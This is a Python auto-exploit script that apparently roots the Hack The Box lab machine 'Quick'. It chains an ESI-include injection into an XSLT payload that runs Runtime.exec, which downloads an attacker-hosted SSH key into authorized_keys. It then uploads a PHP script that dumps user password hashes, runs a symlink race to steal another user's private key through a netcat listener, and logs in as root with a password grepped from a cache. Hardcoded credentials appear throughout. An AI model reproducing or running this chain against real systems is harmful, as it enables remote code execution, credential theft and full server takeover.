# author script1337
import os
import re

import requests
from random import randint
import threading
from time import sleep
import subprocess
from pexpect import pxssh

from termcolor import colored

http_client = "/home/NoBody/Desktop/quick/quiche/target/debug/examples/http3-client \"https://printerv2.quick.htb/docs/Connectivity.pdf\" > script1337.pdf"

header = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://quick.htb:9001/login.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '38',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
}

cookie = ""

header2 = {
    'Host': '10.10.10.186:9001',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://10.10.10.186:9001/ticket.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '33',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
}

s = requests.session()


def get_ip_address():
    return re.search(re.compile(r'(?<=inet )(.*)(?=/)', re.M), os.popen('ip addr show tun0').read()).groups()[0]


xsl = """

<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
    exclude-result-prefixes="date">

  <xsl:output method="text"/>
  <xsl:template match="/">

   <xsl:variable name="cmd"><![CDATA[{command}]]></xsl:variable>
   <xsl:variable name="rtObj" select="rt:getRuntime()"/>
   <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
   <xsl:text>Process: </xsl:text><xsl:value-of select="$process"/>

  </xsl:template>
</xsl:stylesheet>

"""

fetch = """
<?php
include("/var/www/html/db.php");

$stmt=$conn->prepare("select * from users");
$stmt->execute();
$result = $stmt->get_result();
$num_rows = $result->num_rows;
if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        echo $row["email"]. " " . $row["password"]."\n";
    }
} else {
    echo "0 results";
}
?>
"""

code = """
cd /var/www/jobs;
while true;
do
        for file in $(ls .);
        do
                rm -rf $file;
                ln -s /home/srvadm/.ssh/id_rsa $file;
        done
done
"""

def log(text):
    text = "[*] " + text
    color = random_with_N_digits(1)
    if color == 1:
        print(colored(text, 'green'))
    if color == 2:
        print(colored(text, 'red'))
    if color == 3:
        print(colored(text, 'yellow'))
    if color == 4:
        print(colored(text, 'cyan'))
    if color == 5:
        print(colored(text, 'magenta'))
    if color == 6:
        print(colored(text, 'grey'))
    if color == 6:
        print(colored(text, 'white'))
    if color == 7:
        print(colored(text, 'yellow'))
    if color == 8:
        print(colored(text, 'yellow'))
    if color == 9:
        print(colored(text, 'yellow'))
    if color == 0:
        print(colored(text, 'yellow'))


def fetchsrvadm():
    global fetch
    log("Uploading script to fetch hashes from database...")
    f = open("fetch.php", "w+")
    f.write(fetch)
    f.close()
    os.system("scp -i id_rsa fetch.php sam@10.10.10.186:~/")
    log("Executing script...")
    os.system('ssh -i id_rsa sam@10.10.10.186 "php fetch.php"')

def random_with_N_digits(n):
    range_start = 10 ** (n - 1)
    range_end = (10 ** n) - 1
    return randint(range_start, range_end)


def fwritexsl(port):
    f = open("poc.xsl", "w+")
    f.write(xsl.format(
        command='wget http://' + get_ip_address() + ':' + str(port) + '/id_rsa.pub -O /home/sam/.ssh/authorized_keys'))
    f.close()


def create_tunnel():
    global code
    log("Creating tunnel")
    f = open("code.sh", "w+")
    f.write(code)
    f.close()
    #os.system("sudo pkill ssh && kill -9 $(lsof -t -i:80)")
    os.system("echo 'sudo ssh -i id_rsa -L 80:127.0.0.1:80 sam@10.10.10.186' > tunnel.sh")
    os.system("chmod +x tunnel.sh")
    os.system("screen -d -m bash tunnel.sh")
    log("Tunnel successfully created...")

def nc():
    os.remove("srvadm_id_rsa")
    os.system("nc -lnvp 9100 > srvadm_id_rsa")



def symlink():
    vhost = "http://printerv2.quick.htb"
    job_assing = "title=code&desc=&submit="
    log("Uploading script steg 2...")
    os.system("scp -i id_rsa code.sh sam@10.10.10.186:~/")
    os.system('ssh -i id_rsa sam@10.10.10.186 "chmod +x code.sh"')
    log("Excuting script...")
    os.system('ssh -i id_rsa sam@10.10.10.186 "screen -d -m bash code.sh"')
    log("Triggering payload")
    s.post(vhost + "/job.php", job_assing, headers=header)
    log("Steg 2 complete...")

def getsrvadmssh():
    global header
    vhost = "http://printerv2.quick.htb"
    creds_data = "email=srvadm%40quick.htb&password=yl51pbx"
    s.post(vhost, creds_data, headers=header)
    log("Logged In successfully...")
    log("Sending 1st payload steg 1...")
    add_printer = "title=code&type=network&profile=default&ip_address="+get_ip_address()+"&port=9100&add_printer="
    s.post(vhost + "/add_printer.php", add_printer, headers=header)
    log("Steg 1 completed...")
    log("Starting listener")
    t2 = threading.Thread(target=nc)
    t2.start()
    symlink()
    f = open("srvadm_id_rsa", "r")
    key = f.read()
    f.close()
    data = key.replace("\x1b@-----BEGIN", "-----BEGIN")
    data = data.replace("VA\x03", "")
    with open('srvadm_id_rsa', 'w+') as filehandle:
        filehandle.write(data[:-1])


def getroot():
    extract_password = 'cd /home/srvadm/.cache && cat */* | grep "srvadm"'
    os.system("chmod 400 srvadm_id_rsa")
    log("Searching for root password...")
    output = subprocess.check_output('ssh -i srvadm_id_rsa srvadm@10.10.10.186 "'+extract_password+'"', shell=True)
    root = str(output)[39:-31]
    log("Extracting password")
    root = root.replace("%26", "&")
    root = root.replace("%3F", "?")
    log("password Found " + root)
    s = pxssh.pxssh()
    if not s.login('10.10.10.186', 'root', root, sync_multiplier=5 , auto_prompt_reset=False):
        log("SSH session failed on login.")
        print(str(s))
    else:
        log("ROOT SSH session login successful")
        s.sendline('whoami')
        s.prompt()
        log(str(s.before))
        s.interact()





def rce(port1, port2):
    global header, xsl, header2, cookie
    cookie = s.cookies
    host = get_ip_address()
    port = str(port1)
    random = str(random_with_N_digits(4))
    payload = """title=gvfv&msg=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2F{ip}%3A{port}%2F%22+stylesheet%3D%22http%3A%2F%2F{ip}%3A{port}%2Fpoc.xsl%22%3E%0D%0A%3C%2Fesi%3Ainclude%3E&id=TKT-{token}""".format(
        ip=host, port=port, token=random)
    ticket = "http://10.10.10.186:9001/ticket.php"
    log("Generating payload...")
    fwritexsl(port2)
    log("Sending first payload...")
    s.post(ticket, payload, headers=header2)
    s.get("http://10.10.10.186:9001/search.php?search=TKT-" + random, headers=header2)
    log("Payload successfully triggered...")



def getuser():
    global http_client, header
    os.system("clear")
    print(colored("""

             .__        __    
  ________ __|__| ____ |  | __
 / ____/  |  \  |/ ___\|  |/ /
< <_|  |  |  /  \  \___|    < 
 \__   |____/|__|\___  >__|_ \\
    |__|             \/     \/
                            coded by script1337 
                            github: https://github.com/ScRiPt1337
                            
how to use:
    copy your id_rsa file and id_rsa.pub file in same folder
    and run two python sever 
    ex :- terminal one : python -m SimpleHTTPServer 9934
          terminal two : python -m SimpleHTTPServer 9940
""", "yellow"))
    log("Your Ip :" + get_ip_address())
    log("Target ip 10.10.10.186")
    port1 = input("Enter the simplehttpserver first port here : ")
    port2 = input("Enter the simplehttpserver second port here : ")
    log("Starting Attack...")
    potal_web = "http://10.10.10.186:9001/login.php"
    # os.system(http_client)
    data = "email=elisa@wink.co.uk&password=Quick4cc3$$"
    log("Logging into web protal")
    s.post(potal_web, data, headers=header)
    rce(port1,port2)
    fetchsrvadm()
    create_tunnel()
    log("Waiting for 10s for No fucking reason")
    sleep(10)
    log("Trying to set 2nd user ssh")
    getsrvadmssh()
    log("Successfully Get 2nd user ssh key...")
    log("Start rooting the server")
    getroot()



getuser()
